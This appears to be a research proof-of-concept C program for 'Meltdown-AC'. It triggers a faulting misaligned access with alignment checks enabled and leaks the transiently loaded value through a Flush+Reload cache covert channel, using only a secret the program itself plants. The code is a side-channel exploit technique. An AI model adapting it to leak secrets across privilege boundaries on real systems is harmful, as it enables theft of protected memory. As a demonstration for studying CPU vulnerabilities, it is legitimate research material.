#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libcache/cacheutils.h"

#define SUPPRESS_FAULT		1
#define SECRET 'S'

#if defined(__i386__)
  #define ENABLE_AC 					\
    __asm__("pushf\norl $0x40000,(%esp)\npopf")
  #define DISABLE_AC 					\
    __asm__("pushf\nandl $~(0x40000),(%esp)\npopf")
#else
  #define ENABLE_AC 					\
    __asm__("pushf\norl $0x40000,(%rsp)\npopf")
  #define DISABLE_AC 					\
    __asm__("pushf\nandl $~(0x40000),(%rsp)\npopf")
#endif

int main(void) {
  char *buffer;
  int  *p;
  pagesize = sysconf(_SC_PAGESIZE);
  mem = (char*) malloc(pagesize * 256);
  memset(mem, 1, pagesize * 256);

  /* https://en.wikipedia.org/wiki/Bus_error */
  /* malloc() always provides aligned memory */
  buffer = malloc(sizeof(int) + 1);
  
  /* Increment the pointer by one, making it misaligned */
  buffer++;
  *buffer = SECRET;
  printf("buffer contains: %d\n", *buffer);
  p = (int *) buffer;

  // Determine cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  // Flush our shared memory
  flush_shared_memory();

  printf("Output legend:\n");
  printf("  '0'.....Unaligned access sets register to 0\n");
  printf("  '%c'.....Unaligned access leaks register value\n", '0' + *buffer);
  
  for(int r = 0; r < 1000000; r++) {
    // Make sure data is in cache
    maccess(buffer);
    // Enable alignment checks
#if !defined(__aarch64__)
    ENABLE_AC;
#endif
  #if SUPPRESS_FAULT
    if(try_start()) {
  #endif
      /* Dereference it as an int pointer, causing an unaligned access */
      maccess(mem + ('0' + (*p)) * pagesize);
  #if SUPPRESS_FAULT
      try_abort();
    }
    try_end();
  #endif
    // Disable alignment checks
#if !defined(__aarch64__)
    DISABLE_AC;
#endif

    //Recover data from cache covert channel
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) % 256;
      if(mix_i != 0 && flush_reload(mem + mix_i * pagesize)) {
        printf("%c ", mix_i);
        fflush(stdout);
      }
    }
  }

  printf("Meltdown-AC done!\n");

  printf("buffer contains: %d\n", *(buffer));
  free(mem);

  return EXIT_SUCCESS;
}
